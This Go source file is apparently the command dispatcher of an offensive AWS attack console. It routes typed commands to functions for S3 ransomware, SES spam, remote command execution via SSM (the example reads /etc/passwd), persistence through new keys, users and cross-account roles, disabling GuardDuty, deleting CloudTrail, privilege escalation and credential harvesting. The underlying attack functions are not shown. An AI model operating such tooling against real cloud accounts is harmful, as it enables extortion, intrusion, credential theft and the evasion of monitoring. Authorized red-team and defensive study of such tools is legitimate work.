package completion

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/drk1wi/Modlishka/log"
	"github.com/grines/scour/pkg/awsdata"
)

func Commands(line string, t string) {
	switch {

	//Load aws profile from .aws/credentials
	case strings.HasPrefix(line, "token profile"):
		help := HelpText("profile ec2user us-east-1", "Profile is used to load a profile from ~/.aws/credentials.", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			target = parse[2]
			region = parse[3]
			sess = getProfile(target, region)
		}

	//GetSessionToken for current user
	case strings.HasPrefix(line, "token GetSessionToken") && connected == true:
		help := HelpText("token GetSessionToken us-east-1", "GetSessionToken for user", "disabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			region = parse[2]
			token := awsdata.GetSessionToken(sess)
			if token != nil {
				sess = stsSession(*token.Credentials.AccessKeyId, *token.Credentials.SecretAccessKey, *token.Credentials.SessionToken, region)
			}
		}

	//AssumeRole from current user.
	case strings.HasPrefix(line, "token AssumeRole") && connected == true:
		help := HelpText("token AssumeRole role-arn region", "Assume role", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			arn := parse[2]
			region = parse[3]

			sess = assumeRole(arn, region)
			if sess != nil {
				target = arn
			}
		}

	//Assume raw json as credentials. (json format)
	case strings.HasPrefix(line, "token AssumeRaw"):
		help := HelpText("token AssumeRaw us-east-1 '<json data>'", "Use credentials from cli/metadata output.", "enabled")
		parse := ParseCMD(line, 26, help)
		if parse != nil {
			r := regexp.MustCompile(`[^\s"']+|"([^"]*)"|'([^']*)`)
			parts := r.FindAllStringSubmatch(line, -1)
			region = parts[2][0]
			json := parts[3][2]
			sess = assumeRaw(region, json)
		}

	//GetSessionToken or whoami
	case strings.HasPrefix(line, "aws iam get-session-token") && connected == true:
		help := HelpText("aws iam get-session-token", "GetSessionToken returns current token details.", "enabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			awsdata.GetCallerIdentity(sess)
		}

	case strings.HasPrefix(line, "get user") && connected == true:
		help := HelpText("get user username", "Get details for single user.", "enabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			username := parse[2]
			awsdata.GetUser(sess, username)
		}

	case strings.HasPrefix(line, "get instance-profile") && connected == true:
		help := HelpText("get instance-profile name", "Return details about an instance profile.", "enabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			parts := strings.Split(line, " ")
			profile := parts[2]
			awsdata.GetInstanceProfile(sess, profile, false)
		}

	case strings.HasPrefix(line, "get policy") && connected == true:
		help := HelpText("get policy arn", "View json policy.", "enabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			arn := parse[2]
			json := awsdata.GetPolicyVersion(sess, arn)
			fmt.Println(json)
		}

	case strings.HasPrefix(line, "get s3-policy ") && connected == true:
		parts := strings.Split(line, " ")
		bucket := parts[2]
		policy := awsdata.GetBucketPolicy(sess, bucket)
		if policy != nil {
			decodedValue, _ := url.QueryUnescape(aws.StringValue(policy.Policy))

			var prettyJSON bytes.Buffer
			error := json.Indent(&prettyJSON, []byte(decodedValue), "", "\t")
			if error != nil {
				log.Infof("JSON parse error: ", error)
				return
			}

			fmt.Println(string(prettyJSON.Bytes()))
		}

	case strings.HasPrefix(line, "get s3-acl ") && connected == true:
		parts := strings.Split(line, " ")
		bucket := parts[2]
		policy := awsdata.GetBucketACL(sess, bucket)
		if policy != nil {
			fmt.Println(policy)
		}

	case strings.HasPrefix(line, "get user-policy ") && connected == true:
		parts := strings.Split(line, " ")
		user := parts[2]
		policy := parts[3]
		json := awsdata.GetUserPolicy(sess, user, policy)
		status := awsdata.AnalyzePolicy(json)
		fmt.Printf("Privileged: %v\n", status)

	case strings.HasPrefix(line, "analyzer roles") && connected == true:
		awsdata.AnalyzeRoleTrustRelationships(sess)

	//Operations S3ransomware / Cryptomining
	case strings.HasPrefix(line, "attack operations s3-ransom") && connected == true:
		parts := strings.Split(line, " ")
		bucket := parts[3]
		kmsArn := parts[4]
		awsdata.S3RansomWare(sess, bucket, kmsArn)
	case strings.HasPrefix(line, "attack operations ses-spam") && connected == true:
		parts := strings.Split(line, " ")
		account := parts[3]
		to := parts[4]
		from := parts[5]
		subject := parts[6]
		body := parts[7]
		count := 10
		awsdata.SESSpam(sess, account, from, to, subject, body, count)

	//Execution of commands
	case strings.HasPrefix(line, "attack execute ssm-command") && connected == true:
		s := line
		r := regexp.MustCompile(`[^\s"']+|"([^"]*)"|'([^']*)`)
		parts := r.FindAllString(s, -1)
		if len(parts) != 5 || strings.Contains(line, "help") {
			fmt.Println("Example: execute ssm-comand i-i00000000 \"cat /etc/passwd\"")
			fmt.Println("Execution module will run the supplied command on the given instance using SSM command execution.")
			break
		}
		instance := parts[3]
		cmd := parts[4]
		cmdid := awsdata.SendCommand(sess, instance, cmd)
		if cmdid != "" {
			time.Sleep(5 * time.Second)
			awsdata.GetCommandInvocation(sess, instance, cmdid)
		}

	//Persistence operations
	case strings.HasPrefix(line, "attack persist AccessKey") && connected == true:
		parts := strings.Split(line, " ")
		if len(parts) != 4 || strings.Contains(line, "help") {
			fmt.Println("Required: persist Accesskey username")
			break
		}
		username := parts[3]
		awsdata.PersistAccessKey(sess, username)

	case strings.HasPrefix(line, "attack persist EC2") && connected == true:
		parts := strings.Split(line, " ")
		payloadurl := parts[4]
		ami := parts[3]
		awsdata.PersistEC2(sess, ami, payloadurl)

	case strings.HasPrefix(line, "attack persist Role") && connected == true:
		parts := strings.Split(line, " ")
		role := parts[3]
		crossArn := parts[4]
		awsdata.PersistUpdateAssumeRole(sess, role, crossArn, t)
		os.Setenv("AWS_EXECUTION_ENV", t)

	case strings.HasPrefix(line, "attack persist SSM") && connected == true:
		parts := strings.Split(line, " ")
		ami := parts[3]
		awsdata.PersistSSM(sess, ami)

	case strings.HasPrefix(line, "attack persist CrossAccount") && connected == true:
		parts := strings.Split(line, " ")
		account := parts[3]
		awsdata.PersistCrossAccountRole(sess, account)
	case strings.HasPrefix(line, "attack persist CodeBuild") && connected == true:
		parts := strings.Split(line, " ")
		url := parts[3]
		awsdata.PersistCodeBuild(sess, url)
	case strings.HasPrefix(line, "attack persist CreateUser") && connected == true:
		parts := strings.Split(line, " ")
		username := parts[3]
		awsdata.PersistCreateUser(sess, username)

	//Defense Evasion
	case strings.HasPrefix(line, "attack evasion KillGuardDuty") && connected == true:
		awsdata.KillGuardDuty(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack evasion UpdateGuardDuty") && connected == true:
		awsdata.DisableGuardDuty(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack evasion TrustIPGuardDuty") && connected == true:
		parts := strings.Split(line, " ")
		location := parts[3]
		awsdata.TrustIPGuardDuty(sess, location, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack evasion KillCloudTrail") && connected == true:
		parts := strings.Split(line, " ")
		trail := parts[3]
		awsdata.KillCloudTrail(sess, trail, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack evasion StopCloudTrail") && connected == true:
		parts := strings.Split(line, " ")
		trail := parts[3]
		awsdata.StopCloudTrail(sess, trail, t)
		os.Setenv("AWS_EXECUTION_ENV", t)

	//Privesc Operations
	case strings.HasPrefix(line, "attack privesc UserData") && connected == true:
		parts := strings.Split(line, " ")
		payload := parts[3]
		instance := parts[4]
		awsdata.PrivescUserdata(sess, payload, instance)

	//List operations
	case strings.HasPrefix(line, "aws ssm list-parameters") && connected == true:
		awsdata.DescribeParameters(sess)
	case strings.HasPrefix(line, "aws iam list-users") && connected == true:
		awsdata.ListUsers(sess, false)
	case strings.HasPrefix(line, "aws s3 list-buckets") && connected == true:
		awsdata.ListBuckets(sess, false)
	case strings.HasPrefix(line, "aws iam list-groups") && connected == true:
		awsdata.ListGroups(sess, false)
	case strings.HasPrefix(line, "aws ecs list-ecs-task-definitions") && connected == true:
		awsdata.ListTaskDefinitions(sess)
	case strings.HasPrefix(line, "aws iam list-groups-for-user ") && connected == true:
		parts := strings.Split(line, " ")
		username := parts[2]
		awsdata.ListGroupsForUser(sess, username)
	case strings.HasPrefix(line, "aws iam list-roles") && connected == true:
		awsdata.ListRoles(sess, false)
	case strings.HasPrefix(line, "aws iam list-policies") && connected == true:
		awsdata.ListPolicies(sess)

	//Create operations
	case strings.HasPrefix(line, "aws iam create-user") && connected == true:
		help := HelpText("aws iam create-user bob", "Creates a new IAM user", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			username := parse[3]
			user := awsdata.CreateUser(sess, username)
			if user {
				log.Infof("Created user %v.", username)
			} else {
				log.Errorf("Failed to create user  %v.", username)
			}
		}
	case strings.HasPrefix(line, "aws iam create-login-profile") && connected == true:
		help := HelpText("aws iam create-login-profile bob", "Adds login profile to user", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			username := parse[3]
			awsdata.CreateLoginProfile(sess, username)
		}
	case strings.HasPrefix(line, "aws iam create-role") && connected == true:
		var policy string
		help := HelpText("aws iam create-role aws/service accountid/ec2.amazonaws.com", "Updates trust policy of an existing role", "enabled")
		parse := ParseCMD(line, 5, help)
		if parse != nil {
			fmt.Println(parse[2])
			if parse[2] == "aws" {
				policy = awsdata.TrustPolicyAWS(parse[3])
			}
			if parse[2] == "service" {
				policy = awsdata.TrustPolicyService(parse[3])
			}
			rolename := parse[4]
			awsdata.CreateRole(sess, rolename, policy)
		}
	case strings.HasPrefix(line, "aws iam create-policy") && connected == true:
		policy := `{
			"Version": "2012-10-17",
			"Statement": [
				{
					"Effect": "Allow",
					"Action": "*",
					"Resource": "*"
				}
			]
		}`
		help := HelpText("aws iam create-policy SuperAdmin", "Creates a new policy", "enabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			policyname := parse[2]
			awsdata.CreatePolicy(sess, policyname, policy)
		}
	case strings.HasPrefix(line, "aws iam attach-trust-policy") && connected == true:
		var policy string
		help := HelpText("aws iam attach-trust-policy aws/service accountid/ec2.amazonaws.com", "Updates trust policy of an existing role", "enabled")
		parse := ParseCMD(line, 5, help)
		if parse != nil {
			if parse[2] == "aws" {
				policy = awsdata.TrustPolicyAWS(parse[3])
			}
			if parse[2] == "service" {
				policy = awsdata.TrustPolicyService(parse[3])
			}
			rolename := parse[4]
			awsdata.UpdateAssumeRolePolicy(sess, rolename, policy)
		}

	//Create operations
	case strings.HasPrefix(line, "aws iam attach-user-policy") && connected == true:
		help := HelpText("attach user-policy bob arn", "Attaches managed policy to a user.", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			username := parse[2]
			arn := parse[3]
			awsdata.AttachUserPolicy(sess, username, arn)
		}

	//Enumeration
	case strings.HasPrefix(line, "attack enum Role") && connected == true:
		awsdata.RoleEnumerate(sess, t)
	case strings.HasPrefix(line, "attack enum IAM") && connected == true:
		awsdata.IamEnumerate(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack enum EC2") && connected == true:
		awsdata.EnumEC2(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack enum S3") && connected == true:
		awsdata.EnumS3(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack enum Groups") && connected == true:
		awsdata.GroupsEnumerate(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack enum LateralNetwork") && connected == true:
		awsdata.EnumLateralNetwork(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack enum Organizations") && connected == true:
		awsdata.EnumOrg(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack enum UserGroup") && connected == true:
		awsdata.UserGroupEnumerate(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)

	//Lateral Movement
	case strings.HasPrefix(line, "attack enum CrossAccount") && connected == true:
		awsdata.EnumCrossAccount(sess)
	case strings.HasPrefix(line, "attack lateral Console") && connected == true:
		parts := strings.Split(line, " ")
		user := parts[3]
		awsdata.LateralConsole(sess, user)

	//Credential Discovery
	case strings.HasPrefix(line, "attack creds UserData") && connected == true:
		awsdata.CredentialDiscoveryUserData(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack creds SSM") && connected == true:
		awsdata.CredentialDiscoverySSMParams(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack creds ECS") && connected == true:
		awsdata.CredentialDiscoveryECSEnv(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)
	case strings.HasPrefix(line, "attack creds Lambda") && connected == true:
		awsdata.CredentialDiscoveryLambda(sess, t)
		os.Setenv("AWS_EXECUTION_ENV", t)

	//Show command history
	case line == "history":
		dat, err := ioutil.ReadFile("/tmp/readline.tmp")
		if err != nil {
			break
		}
		fmt.Print(string(dat))

	//exit
	case line == "quit":
		connected = false

	//Default if no case
	default:
		cmdString := line
		if connected == false {
			fmt.Println("You are not connected to a profile.")
		}
		if cmdString == "exit" {
			os.Exit(1)
		}

	}
}
